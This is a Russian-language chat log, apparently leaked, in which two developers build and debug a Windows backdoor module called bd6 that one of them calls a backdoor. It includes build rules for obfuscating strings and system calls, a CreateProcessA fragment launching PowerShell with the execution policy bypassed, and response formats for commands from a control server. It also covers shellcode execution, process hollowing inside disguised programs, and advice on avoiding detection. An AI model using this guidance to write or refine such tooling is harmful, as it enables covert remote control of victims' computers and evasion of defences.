Timestamp	From	To	Message
2020-08-20 12:38:19.385652	mushroom	price	Там сразу бдет x86\x64
2020-08-20 12:38:45.390346	price	mushroom	а что со старым случилось?
2020-08-20 12:39:21.332303	mushroom	price	Не знаю. Он у тебя странный какой то. Только debug был Win32.
2020-08-20 12:39:26.684779	mushroom	price	Как ты его создавал.
2020-08-20 12:39:34.597376	price	mushroom	у меня ещё более старый был, он совсем испортился -при старте открывает консоль и пишет что нет ntoskrnl.exe
2020-08-20 12:39:56.574832	mushroom	price	ОФОРМЛЕНИЕ МОДУЛЯ
1. Должен иметься проект Microsoft Visual Studio версии не ниже 2015.
2. Проект Visual Studio должен быть настроен следующим образом:
* Для ВСЕХ профилей сборки:
- выходной каталог: $(SolutionDir)bin\$(PlatformTarget)\$(Configuration)\
- Промежуточный каталог: $(SolutionDir)obj\$(Platform)\$(Configuration)\$(ProjectName)\
- Многопроцессорная компиляция: да
* Профиль Release:
- Формат отладочной информации (С/С++ общие): нет
- Создавать отладочную информацию (компоновщик/отладка): нет
3. Строки обфусцировать библиотекой Andrivet (приложена, см.макрос _STR())
4. Системные вызовы обфусцировать библиотекой GetApi.h. Быть внимательным, обфускация сисвызовов может давать падения.
5. Модуль должен иметь две версии - x32- и x64-разрядную.
6. В боевой сборке должны быть обфусцированы по максимуму строки, отключен всяческий отладочный вывод.
7. Модуль должен иметь отладочную версию. Отладочный вывод должен выводиться в c:/temp/modulename.log (путь к логу настраивается в макросе).
Каждая запись лога должна содержать временнУю метку с точностью до секунды.
8. В проекте должен быть файл настроек config.h (название неважно, важна суть - здесь все глобальные настройки - пути, макросы-переключатели условной компиляции итд).
9. Модуль должен работать на всех современных версиях Windows.
   Минимальная поддерживаемая версия Windows - Windows XP (если невозможно - Windows Vista).
10. Дополнительно к компоновке должен добавляться файл notelemetry.obj (https://stackoverflow.com/questions/37761768/how-to-prevent-visual-studio-2015-update-2-to-add-telemetry-main-invoke-trigger)
2020-08-20 12:40:04.884403	mushroom	price	Так его настрой.
2020-08-20 12:40:09.908195	mushroom	price	Проект.
2020-08-20 12:40:24.150130	price	mushroom	ок
2020-08-20 12:40:38.002154	mushroom	price	Обфусцирование и т.д. не нужно пока.
2020-08-20 12:41:14.497681	price	mushroom	а по ошибкам? что там может быть?
2020-08-20 12:41:33.525215	mushroom	price	То есть пункты 1, 2, 5, 7 реализуй.
2020-08-20 12:41:43.516217	price	mushroom	без углубления, чтобы тебя не грузить
2020-08-20 12:41:55.291492	mushroom	price	По каким whoami не находит?
2020-08-20 12:42:06.185662	mushroom	price	cmd /c whoami пробовал?
2020-08-20 12:42:55.563317	price	mushroom	если я ставлю /с (этим уже давно страдаю) даже dir не выдает, убираю-выдает
2020-08-20 12:43:23.136851	mushroom	price	Это ты где так делаешь?
2020-08-20 12:43:28.513992	price	mushroom	с /с пустая строка, без /с - не найдена команда
2020-08-20 12:43:38.312515	price	mushroom	в createprocess
2020-08-20 12:43:42.777743	price	mushroom	cmdline
2020-08-20 12:43:50.766229	price	mushroom	launcher
2020-08-20 12:44:12.871770	price	mushroom	            lstrcpyA(cmdline, icommand == 12 ? "cmd.exe " : "powershell.exe -ExecutionPolicy Bypass -Command -");
2020-08-20 12:44:33.181100	price	mushroom	   if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 0, BOTenvironment, NULL, (LPSTARTUPINFOA)&si, &pi)) {
2020-08-20 12:45:00.821460	mushroom	price	BOTenvironment замени на NULL
2020-08-20 12:45:05.572855	price	mushroom	причем когда отлаживал тему, всё работало
2020-08-20 12:45:09.186841	price	mushroom	кроме /с
2020-08-20 12:45:15.478892	price	mushroom	вотвот
2020-08-20 12:45:19.274829	mushroom	price	Процесс и так наследует от родительского все переменные
2020-08-20 12:45:27.480860	price	mushroom	а как тогда переменную окружения передавать?
2020-08-20 12:45:44.469552	price	mushroom	или просто устанавливать?
2020-08-20 12:45:53.270407	mushroom	price	Они наследуются от родительского.
2020-08-20 12:45:55.573476	price	mushroom	SET&
2020-08-20 12:45:58.855673	price	mushroom	?
2020-08-20 12:46:10.990051	price	mushroom	а в родительские как?
2020-08-20 12:46:22.499799	mushroom	price	В прграмме просто сделай SetEnvironmentVariable
2020-08-20 12:49:22.339432	mushroom	price	/c не нужно использовать если через пайп пишешь сценарий
2020-08-20 12:49:45.588033	mushroom	price	Если чере пайп пишешь всегда на конце каждой команды надо \r\n
2020-08-20 12:50:12.274068	price	mushroom	я и не делал
2020-08-20 12:50:22.945541	price	mushroom	а перевод каретки ставил
2020-08-20 12:50:28.541670	mushroom	price	whoami\r\n
2020-08-20 12:50:42.727294	price	mushroom	а с файлом, что нужно?
2020-08-20 12:50:55.518071	mushroom	price	Запусти процесс cmd.exe и напиши в пайп whoami\r\n
2020-08-20 12:52:02.249479	price	mushroom	заработало! с пайпом
2020-08-20 12:52:15.196640	price	mushroom	а с дампом в файл -нужно делать?
2020-08-20 12:52:37.896588	price	mushroom	странностей гораздо уменьшилось
2020-08-20 12:53:02.962683	mushroom	price	BOTenvironment после того как это убрал?
2020-08-20 12:53:16.223322	price	mushroom	да
2020-08-20 12:53:42.844627	price	mushroom	и поставил	SetEnvironmentVariableA("VERS=", hexHashID);
2020-08-20 12:53:48.604410	mushroom	price	Вот значит ты системные переменные портил, вот и не находилось что нужно.
2020-08-20 12:54:12.523577	mushroom	price	А теперь они наследуются от твоей прогаммы.
2020-08-20 12:54:34.984881	price	mushroom	и у PS стал нормальный шрифт!!!
2020-08-20 12:54:48.872103	price	mushroom	гружу успех на гитлаб
2020-08-20 12:55:53.016517	price	mushroom	жалко ты по ночам спишь
2020-08-20 12:56:55.516149	mushroom	price	Проект оформи.
2020-08-20 12:57:03.012379	mushroom	price	По нормальному.
2020-08-20 12:57:11.868775	price	mushroom	да, сделаю
2020-08-20 12:57:38.698426	price	mushroom	в смысле как ты накопировал повыше?
2020-08-20 12:57:54.806671	price	mushroom	требования по оформлению?
2020-08-20 12:58:07.143670	mushroom	price	Да. Создай пустой проект C++ и туда файлы свои добавь и настрой как я писал выше.
2020-08-20 12:58:16.542089	mushroom	price	Название проекта и решения bd6
2020-08-20 12:58:32.388949	mushroom	price	SetEnvironmentVariable("VERS"), env);
2020-08-20 12:58:48.456177	mushroom	price	Без =
2020-08-20 12:59:00.800095	price	mushroom	и без скобки
2020-08-20 12:59:34.633720	mushroom	price	SetEnvironmentVariable(TEXT("VERS"), env);
2020-08-20 12:59:41.858109	mushroom	price	Опечатка.
2020-08-20 13:00:05.690325	price	mushroom	ок
2020-08-20 13:00:40.463923	mushroom	price	Это универсальная версия с TEXT и без суффикса A или W.
2020-08-20 13:01:30.788102	price	mushroom	понимаю.
2020-08-20 13:07:20.828532	mushroom	price	По поводу того что nltest нету на x86 значит отправляй то что выведется или код ошибки GetLastError. Там где вывод в нормальном ситуации.
2020-08-20 13:07:56.685863	price	mushroom	ok, а ты у себя попробуешь? чтоб я знал
2020-08-20 13:08:16.518071	mushroom	price	Я попробовал запустить nltest в powershell x86
2020-08-20 13:08:22.828635	mushroom	price	Нету такой программы.
2020-08-20 13:08:32.590685	price	mushroom	то есть так же
2020-08-20 13:09:49.000048	mushroom	price	Вообще какие ошибки при запуске процесса, код ошибки в ответе на эту команду надо посылать. Получается PID 0 Msg <Код ошибки>
2020-08-20 13:10:19.254880	mushroom	price	pid=1234
stdout and stderr here

Если произошла ошибка запуска, в качестве идентификатора отдается 0 (ноль), и следующей строкой идет сообщение об ошибке.
2020-08-20 13:10:34.932642	mushroom	price	Вот так в ТЗ написано.
2020-08-20 13:10:35.157602	price	mushroom	ok
2020-08-20 13:10:51.591349	price	mushroom	как раз сейчас ответ на Терминате посылаю
2020-08-20 13:35:32.666924	price	mushroom	сделал Terminate на несуществующий процесс. Система вот так восприняла мой ответ:PID_0_Msg_87:
2020-08-20 13:35:52.114421	price	mushroom	может она просит текстового расширения диагностики?
2020-08-20 13:38:05.622792	mushroom	price	5.4. Ответ на команду 15 об остановке процесса
В качестве ответа возвращается результат выполнения GetLastError() сразу после выполнения TerminateProcess()
в виде десятичного числа
2020-08-20 13:38:16.337984	mushroom	price	Просто цифра.
2020-08-20 13:38:43.881686	mushroom	price	Не надо писать PID и т.д.
2020-08-20 13:38:53.706543	price	mushroom	ок
2020-08-21 09:07:21.424119	mushroom	price	Привет. Посмотрел сейчас то что в GitLab
2020-08-21 09:07:30.048208	mushroom	price	Информация о системе нормально работает.
2020-08-21 09:07:37.328129	mushroom	price	Hollowing не работает.
2020-08-21 09:07:39.700766	price	mushroom	привет
2020-08-21 09:07:42.117012	price	mushroom	спасибо
2020-08-21 09:07:50.567491	price	mushroom	да, я над ним работаю
2020-08-21 09:08:16.850498	price	mushroom	там в инфо я два запроса пока отрубил, в отладке не хватает терпения 2 минуты ждать
2020-08-21 09:08:45.169328	mushroom	price	Запуск с сохранением на диск работает так что ответ приходит раньше таймаута, то есть процесс раньше завершается чем должен наверное, файл не удаляется.
2020-08-21 09:08:45.849080	price	mushroom	сейчас ещё логирование изучаю, хочу внедрить
2020-08-21 09:09:07.389416	mushroom	price	bat без сохранения на диск работает правильно.
2020-08-21 09:09:14.671303	price	mushroom	#define  debug_logA(fmt, ...)  {wprintfA(fmt, __VA_ARGS__);wfprintf(_LOG_FILE,fmt, __VA_ARGS__)}
2020-08-21 09:09:19.365291	mushroom	price	bat с сохранением на диск не правильно.
2020-08-21 09:09:27.355443	price	mushroom	понял
2020-08-21 09:09:32.976916	mushroom	price	Вывод у них разный получился, а должен быть один.
2020-08-21 09:09:47.113535	mushroom	price	ps1 без сохранения на диск падает.
2020-08-21 09:09:54.607177	price	mushroom	подольше подольше подождать?
2020-08-21 09:10:02.928067	mushroom	price	ps1 с сохранением на диск падает.
2020-08-21 09:10:17.162000	mushroom	price	Программа падает. когда ps1
2020-08-21 09:10:24.167981	price	mushroom	понял
2020-08-21 09:10:31.988910	mushroom	price	Шелл код падает программа тоже.
2020-08-21 09:10:51.811309	price	mushroom	странно, я ночью норм запускал
2020-08-21 09:11:07.352120	price	mushroom	посмотрю на твоем шелле
2020-08-21 09:11:29.586720	price	mushroom	а какой скрипт на ps1?
2020-08-21 09:11:29.914714	mushroom	price	Я как раз свой и запускал, который не предназначен для x64
2020-08-21 09:11:47.140094	mushroom	price	ps1 скрипт простой cd c:\\r\ndir\r\n
2020-08-21 09:11:55.347137	mushroom	price	Для bat такой же.
2020-08-21 09:12:04.171890	price	mushroom	я твой не запускал, только 90 90 c3
2020-08-21 09:12:35.431165	price	mushroom	у себя я этот dir запускал нормально, посмотрю конечно
2020-08-21 09:13:08.413264	mushroom	price	Программа должна не падать даже если там мусорный какой нибудь шелл код запускать. Для этого и есть SEH, я тебе пример давал.
2020-08-21 09:13:30.483686	price	mushroom	я seh только на shellcode поставил
2020-08-21 09:13:42.549920	mushroom	price	Скрипт именно 2 команды cd c:\\r\ndir\r\n
2020-08-21 09:13:42.598331	price	mushroom	думал и теперь поставлю везде
2020-08-21 09:13:54.850016	mushroom	price	Чтобы вывело содержимое c:\
2020-08-21 09:14:04.454448	price	mushroom	этого не было у меня-только dir
2020-08-21 09:14:16.666556	mushroom	price	Не надо везьде SEH только там где запускается шелл код.
2020-08-21 09:14:39.293715	price	mushroom	я думал на bat/ps1/exe/dll тоже надо
2020-08-21 09:15:32.272900	price	mushroom	на шеле стоит seh, я тестировал на некорректном shellcode
2020-08-21 09:15:43.211444	mushroom	price	Там не надо. Там всё проверяется по коду возврата и GetLastError.
2020-08-21 09:16:14.799808	price	mushroom	тогда что значит падает bat/ps1
2020-08-21 09:16:26.270665	mushroom	price	ps1 только падает.
2020-08-21 09:16:27.809781	price	mushroom	просто не выполняется
2020-08-21 09:16:35.599475	mushroom	price	Падает программа.
2020-08-21 09:16:45.981256	price	mushroom	понял, вылетает
2020-08-21 09:16:51.803591	mushroom	price	Исключение.
2020-08-21 09:16:58.659625	price	mushroom	тогда надо наверное seh
2020-08-21 09:17:22.267860	mushroom	price	Не надо. Это ошибка у тебя там где то.
2020-08-21 09:17:37.004445	mushroom	price	SEH только для шелл кода.
2020-08-21 09:17:59.986716	price	mushroom	хорошо посмотрю, я работаю по всему ТЗ на бумажке. У меня минусы расставлены везде и я их на плюсы меняю.
2020-08-21 09:18:42.431230	price	mushroom	в howlinge есть какие-то проблемы, или по образцу можно легко сделать?
2020-08-21 09:19:16.968237	price	mushroom	я текст смотрел, но его много. Ну и принцип знаю, но не реализовывал ещё.
2020-08-21 09:19:23.948389	mushroom	price	В общем так проверяй как сделаешь. Hollowing для всех маскирующих программ запусти, запусти процесс с сохранением на диск, bat cd c:\\r\ndir\r\n, ps1 cd c:\\r\ndir\r\n
2020-08-21 09:19:41.389034	price	mushroom	блин даже не вспомнил правильно -Холовинг
2020-08-21 09:19:53.225024	price	mushroom	ок, работаю
2020-08-21 09:19:57.825297	mushroom	price	По примеру который я тебе давал hollowing.
2020-08-21 09:20:09.737927	price	mushroom	буквально?
2020-08-21 09:20:38.242535	price	mushroom	холовинг-долюёжка, выдалюливание, я путаю всегда с хоулингом-завывание
2020-08-21 09:20:58.504629	price	mushroom	ю=б
2020-08-21 09:21:27.840528	mushroom	price	Нет не буквально копировать в ставить. Для себя подправь что надо. Принцип создал процесс приостановленный, подменил его образ на свой, возобновил главный поток процесса.
2020-08-21 09:22:23.253213	price	mushroom	принцип знаю, не знаю, но скоро узнаю, эту реализацию
2020-08-21 09:22:23.720831	mushroom	price	Там в коде всё прокомментированно.
2020-08-21 09:22:29.741536	price	mushroom	ок
2020-08-21 09:22:41.806860	mushroom	price	В общем так проверяй как сделаешь. Hollowing для всех маскирующих программ запусти, запусти процесс с сохранением на диск, bat cd c:\\r\ndir\r\n, ps1 cd c:\\r\ndir\r\n
2020-08-21 09:22:54.456783	price	mushroom	хорошо
2020-08-21 09:23:01.364364	mushroom	price	Как это всё будет работать пиши мне, тогда я посмотрю.
2020-08-21 09:23:08.511979	price	mushroom	ок
2020-08-21 09:23:16.163241	mushroom	price	И проект не забудь оформить как я вчера писал.
2020-08-21 09:23:37.181742	price	mushroom	я оформил, кроме название солюшена
2020-08-21 09:23:59.084990	price	mushroom	в лоб не меняется, а переносить уу меня времени не хватило
2020-08-21 09:24:00.852531	mushroom	price	Он на GitLab?
2020-08-21 09:24:06.302329	price	mushroom	директории и опции все поставил
2020-08-21 09:24:09.151748	price	mushroom	да
2020-08-21 09:24:22.762949	price	mushroom	может там и бат с пс1 заработает
2020-08-21 09:24:33.495092	price	mushroom	я интенсивно сейчас правил и сбрасывал
2020-08-21 09:24:36.328249	price	mushroom	но ночью
2020-08-21 09:24:45.124110	mushroom	price	Нет. Я сейчас брал последнее что есть.
2020-08-21 09:24:46.160007	price	mushroom	с 3до 7 утра
2020-08-21 09:25:00.786505	price	mushroom	значит хуже дело, посмотрю
2020-08-21 09:25:15.297617	price	mushroom	но директории то я точно поправил
2020-08-21 09:25:28.944903	price	mushroom	bin/x86/debug or release
2020-08-21 09:27:08.269916	mushroom	price	Проект переделай всё равно, всё равно, как я говорил, по новой файлы скопируй туда в пустой проект просто.
2020-08-21 09:28:18.079235	mushroom	price	Я тебе дам программы для проверки hollowing, test не нужны будут.
2020-08-21 09:30:20.522429	price	mushroom	хорошо, давай
2020-08-21 09:30:24.005423	mushroom	price	Download: https://qaz.im/load/9erYBN/B3nZ76   
Delete: https://qaz.im/index.php?a=delete&q=2095280175
Пароль: 123
2020-08-21 09:30:40.167772	mushroom	price	Бесконечно выводит TestOutput
2020-08-21 09:31:07.506685	mushroom	price	Сценарии я выше написал, шелл код у тебя есть.
2020-08-21 09:31:17.829128	price	mushroom	принял удалил
2020-08-21 09:32:39.582436	price	mushroom	а что такое U C?
2020-08-21 09:32:52.825243	price	mushroom	не могу догадаться, юникод?
2020-08-21 09:33:30.039194	mushroom	price	U юникод, C консольное приложение.
2020-08-21 09:34:05.532167	price	mushroom	а без С, GUI?
2020-08-21 09:34:26.684352	mushroom	price	Да, но без окна.
2020-08-21 09:34:37.671161	price	mushroom	ок
2020-08-21 09:34:49.929006	mushroom	price	/SUBSYSTEM:WINDOWS
2020-08-21 09:34:59.531430	price	mushroom	это понятно
2020-08-21 09:35:00.611721	mushroom	price	/SUBSYSTEM:CONSOLE
2020-08-21 09:44:11.818859	mushroom	price	Download: https://qaz.im/load/yrDB9a/Yi22dn   
Delete: https://qaz.im/index.php?a=delete&q=1266551332
Пароль: 123
2020-08-21 09:44:17.630730	mushroom	price	dll тестовое
2020-08-21 09:44:34.558900	price	mushroom	ок
2020-08-21 09:44:37.271107	mushroom	price	запускается так rundll32.exe TestOutput32.dll,Run
2020-08-21 09:44:47.920830	mushroom	price	Например для 32 битного.
2020-08-21 09:44:53.363114	price	mushroom	исчерпывающая инструкция
2020-08-21 09:44:53.395463	mushroom	price	Показывает окно.
2020-08-21 09:46:03.731069	mushroom	price	В команде в Parameters Run укажешь.
2020-08-21 09:46:28.551096	price	mushroom	да, я в курсе
2020-08-21 09:46:44.454769	price	mushroom	я свои тесты написал и тестировал уже
2020-08-21 09:49:36.541309	mushroom	price	У testoutput типа такой вывод:
Startup info
Desktop: Winsta0\Default
Title: Microsoft.Windows.Explorer
X: 0
Y: 0
XSize: 0
YSize: 0
XCountChars: 0
YCountChars: 0
FillAttribute: 2876548156
Flags: 257
ShowWindow: 0
StdInput: FFFFFFFFFFFFFFFF
StdOutput:
0000000000001BB0
StdError: 0000000000001B0C

Standard output: 0000000000001BB0
Standard error: 0000000000001B0C

Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test
output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test
output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test
output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
2020-08-21 09:49:51.148431	mushroom	price	Это с таймаутом 60 сек.
2020-08-21 09:49:51.316509	price	mushroom	уже получил
2020-08-21 09:50:15.626461	mushroom	price	Вот у тебя с сохранением на диск вывод был гораздо меньше.
2020-08-21 09:50:17.375937	price	mushroom	даже пришлось через таскменеджер убивать
2020-08-21 09:50:42.005392	price	mushroom	так у меня однократная печать, без цикла
2020-08-21 09:51:10.815107	mushroom	price	А должен был 60 секунд работать.
2020-08-21 09:51:18.482454	price	mushroom	кстати а как поступать с такими программами
2020-08-21 09:51:27.356125	mushroom	price	И то что вывелось за это время отправить на сервер.
2020-08-21 09:51:28.537176	price	mushroom	после таймацта терминалить?
2020-08-21 09:51:40.926523	mushroom	price	Да. То что вывелось на сервер.
2020-08-21 09:51:49.221396	price	mushroom	а если в фоне, то что отправлять?
2020-08-21 09:52:06.481382	price	mushroom	когда нет лимита на время работы
2020-08-21 09:52:09.920829	mushroom	price	Если фоновый просто PID его на сервер после того как запустил.
2020-08-21 09:52:20.837752	price	mushroom	выдачу не отправлять?
2020-08-21 09:52:26.210826	mushroom	price	Нет.
2020-08-21 09:52:30.809562	price	mushroom	ок
2020-08-21 09:52:45.178295	mushroom	price	Всё что фоновое нас не интересует.
2020-08-26 08:59:58.564076	mushroom	price	Привет. Как успехи?
2020-08-26 11:34:47.816939	price	mushroom	привет
2020-08-26 11:35:43.521328	price	mushroom	нормальные успехи. Поправил exe,dll. Перестроил программу.
2020-08-26 11:37:52.629589	price	mushroom	Поправил shellcode, правда когда запускаю твой код -просто вываливается с ошибкой и ничего не видно, что делает. Но не из программы, просто на except.
2020-08-26 11:38:26.922111	price	mushroom	Осталась последняя задача, холовинг.
2020-08-26 11:39:41.613790	price	mushroom	да, и весит программа для x86 - 16 kB, x64  -20KB
2020-08-26 11:40:40.143058	price	mushroom	выделил стандартную библиотеку в отдельный проект No_CRT_lib.lib
2020-08-26 11:41:08.853647	price	mushroom	загрузил всё на гитлаб.
2020-08-26 11:45:57.078660	price	mushroom	Вот только https://n4iaacb37wmqclht.onion периодически зависает :(, как сейчас например не могу Пуш сделать.
2020-08-26 12:15:00.491277	mushroom	price	OK.
2020-08-26 12:16:02.534148	price	mushroom	Такое бывает, чтоб гитлаб отвисал. Мне нужно знать-это типичное дело, либо специфика моего интернета?
2020-08-26 12:16:34.966393	price	mushroom	И про dll, он запускается, я на ОК давлю, но выдачи с него нет.
2020-08-26 12:16:41.473527	price	mushroom	И от шелкода нет.
2020-08-26 12:20:28.820611	mushroom	price	Это типичное дело, у  еня тоже не роаботаетGitLab. В dll нету выдачи, она же работает в процессе rundll.exe, а он ничего не выводит. У шелл кода тоже нету выдачи никакой.
2020-08-26 12:21:24.686346	price	mushroom	тогда всё в порядке. Сейчас отосплюсь и холовинг сделаю.
2020-08-26 12:22:04.869074	price	mushroom	но странно, я со своего ДЛЛ получал выдачу.
2020-08-26 12:22:29.524521	price	mushroom	правда он консольный был.
2020-08-28 09:29:44.375055	mushroom	price	Привет. Когда смотреть можно будет твой бэкдор?
2020-08-28 09:31:46.967027	mushroom	price	И опять напоминаю писать в redmine каждый день, а не раз в неделю.
2020-08-28 09:31:49.726885	price	mushroom	положил
2020-08-28 09:32:07.181095	mushroom	price	То что в GitLab не собирается у меня.
2020-08-28 09:32:12.032985	price	mushroom	были проблемы с контролем кучи, сейчас их решил
2020-08-28 09:32:30.006987	price	mushroom	а в чем проявляется? не сборка
2020-08-28 09:32:55.231388	mushroom	price	bd6 не собирается, нету crt_no_lib
2020-08-28 09:33:11.002121	mushroom	price	crt_no_lib не собирается Серьезность	Код	Описание	Проект	Файл	Строка	Состояние подавления
Ошибка	C2371	strlen: переопределение; различные базовые типы (компилируется исходный файл printf\printf.c)	no_CRT_lib	C:\Users\ivana\Projects\others\bd6\no_CRT_lib\printf\tinycrt.h	42
2020-08-28 09:33:13.511216	price	mushroom	так её надо тоже собирать
2020-08-28 09:33:51.090177	price	mushroom	там есть проект в решении no_CRT_lib
2020-08-28 09:33:55.087472	mushroom	price	Сделай зависимости проектов тогда, чтобы собиралось всё что нужно.
2020-08-28 09:34:08.960684	mushroom	price	no_CRT_lib
Ошибка      C2371      strlen: переопределение; различные базовые типы (компилируется исходный файл printf\printf.c)      no_CRT_lib      C:\Users\ivana\Projects\others\bd6\no_CRT_lib\printf\tinycrt.h      42
2020-08-28 09:34:15.590515	mushroom	price	Не собирается она.
2020-08-28 09:34:33.128082	price	mushroom	на нем надо нажать правой кнопкой и сделать rebuild
2020-08-28 09:34:46.635140	price	mushroom	сейчас попробуй
2020-08-28 09:34:48.487639	mushroom	price	Тоже самое.
2020-08-28 09:35:02.043533	price	mushroom	я в виртуалке смоделирую
2020-08-28 09:35:09.766169	price	mushroom	у меня все собирается
2020-08-28 09:35:19.652183	price	mushroom	в вртуалке не пробовал
2020-08-28 09:35:26.934664	price	mushroom	у меня вопрос ещё
2020-08-28 09:35:44.290558	price	mushroom	я когда твой exe запускаю, то все отрабатывает
2020-08-28 09:36:24.100207	price	mushroom	а сгенерил свой (он тоже в решении есть test32exe.exe у него stdout не перехватывается. Почему?
2020-08-28 09:37:25.655929	price	mushroom	да, и no_CRT_lib я только на x86 собирал, может ты другую собираешь
2020-08-28 09:37:56.937594	price	mushroom	на других не установлены могут быть значения в насройках
2020-08-28 09:38:06.507808	mushroom	price	Я собираю x64
2020-08-28 09:38:17.556818	mushroom	price	Debug x64
2020-08-28 09:38:24.248403	price	mushroom	попробуй для разногобразия х86 дебуг
2020-08-28 09:38:48.231166	price	mushroom	по крайней мере no_CRT_lib
2020-08-28 09:38:59.698266	price	mushroom	сам бот настроен на все опции
2020-08-28 09:39:04.741951	mushroom	price	x64 основная сборка для работы.
2020-08-28 09:39:14.633196	mushroom	price	x86 собрался no_crt
2020-08-28 09:39:19.273424	price	mushroom	сам бот настроен на все опции
2020-08-28 09:39:30.263962	mushroom	price	x64 надо в первую очередь.
2020-08-28 09:39:47.439258	price	mushroom	сам бот настроен на все опции, и на х64 тоже
2020-08-28 09:40:07.531966	price	mushroom	статич.библиотека была только на х86
2020-08-28 09:40:56.729423	price	mushroom	не вопрос её на всё настроить
2020-08-28 09:42:01.773215	price	mushroom	по моему вопросу можешь подсказать? Почему stdout не читает из моего тестового примера? Сорсы можешь посмотреть в соответствующих проектах.
2020-08-28 09:44:12.634522	mushroom	price	Я пишу там обычной функцией printfA или printfW
2020-08-28 09:44:23.174437	price	mushroom	и я тоже
2020-08-28 09:44:30.492793	price	mushroom	но уже все перепробовал
2020-08-28 09:44:50.168023	price	mushroom	текст одна строчка в цикле
2020-08-28 09:44:59.408826	mushroom	price	Ты пишешь frontf
2020-08-28 09:45:03.810539	mushroom	price	fprintf
2020-08-28 09:45:23.644871	price	mushroom	это последняя попытка, а так было конечно printf
2020-08-28 09:45:48.446430	price	mushroom	ukfdyjt xnj d rjycjkm jyj dslftn
2020-08-28 09:46:17.684548	price	mushroom	главное что в консоль оно выдает
2020-08-28 09:46:38.853498	price	mushroom	а в createprocess только твое
2020-08-28 09:46:46.996397	mushroom	price	А если сделать приложение не консольным.
2020-08-28 09:47:02.178792	price	mushroom	и помоему наоборот твои тесты в консоль не выдают
2020-08-28 09:47:24.119638	price	mushroom	это я не пробовал, хотя смотрел твой тест в ide
2020-08-28 09:47:25.766859	mushroom	price	Не выдают, на деле же это палевно.
2020-08-28 09:48:01.391822	price	mushroom	так тесты же
2020-08-28 09:49:07.892770	mushroom	price	Вот тебе проект этот.
Download: https://qaz.im/load/DGfdrQ/YhbFK6   
Delete: https://qaz.im/index.php?a=delete&q=538436343
Пароль: 1234567890
2020-08-28 09:49:14.030025	price	mushroom	попробую в гуи уйти и попробовать, хотя когда я отлаживал ехе уже давным давно у меня всё везде выдавалось и перехватывалось в пайпах
2020-08-28 09:50:11.753231	mushroom	price	Настрой все зависимости у проектов, чтобы собиралось всё сразу x86 и x64.
2020-08-28 09:50:30.909300	price	mushroom	хорошо
2020-08-28 09:51:35.125363	price	mushroom	ты кучу информации выдаешь с какой целью? координаты, хендлы и пр.
2020-08-28 09:52:11.071456	mushroom	price	Просто для кучи. Первое что в голову пришло выводить у процесса.
2020-08-28 09:52:21.508356	price	mushroom	понял
2020-08-28 09:57:31.592670	mushroom	price	У fprintf надо делать flush ытобы записалось в поток, а  то там пишеться в промежуточный буфер сначала, у меня такое было, не выводилось, но ты это делаешь у себя я вижу.
2020-08-28 09:57:51.598120	price	mushroom	я флаш тоже делаю
2020-08-28 09:57:57.062807	price	mushroom	см тест
2020-08-28 09:58:18.433934	price	mushroom	не дочитал
2020-08-28 09:58:21.926821	price	mushroom	я
2020-08-28 09:59:22.404865	mushroom	price	Ещё stdout у не консольного приложения не работает вроде. По этому я у себя пишу везде через printfA или printfW.
2020-08-28 10:00:31.638752	price	mushroom	таинственно для меня что всё это работало, и все заключается только в createprocess, который отрабатывает на тебе
2020-08-28 10:02:30.806641	mushroom	price	Может из-за того что test32 это юникод приложение, fprintf это ANSI функция.
2020-08-28 10:03:01.314966	price	mushroom	там и широкая версия есть
2020-08-28 10:03:20.555532	price	mushroom	и fprintf в последний момент встал
2020-08-28 10:03:33.570997	price	mushroom	так было printf
2020-08-28 10:03:53.225108	mushroom	price	printf тоже ANSI
2020-08-28 10:03:54.415574	price	mushroom	так на консоль то печатает!
2020-08-28 10:04:29.406456	price	mushroom	у меня debug_printf посмотри-он unicode
2020-08-28 10:04:44.382068	price	mushroom	я в него L"" строку передаю
2020-08-28 10:26:39.930924	mushroom	price	Проверил у себя. У меня всё работает с твоим test32exe.exe
2020-08-28 10:27:04.891299	price	mushroom	вот и я говорю
2020-08-28 10:27:19.949756	mushroom	price	test32dll.exe нету вывода.
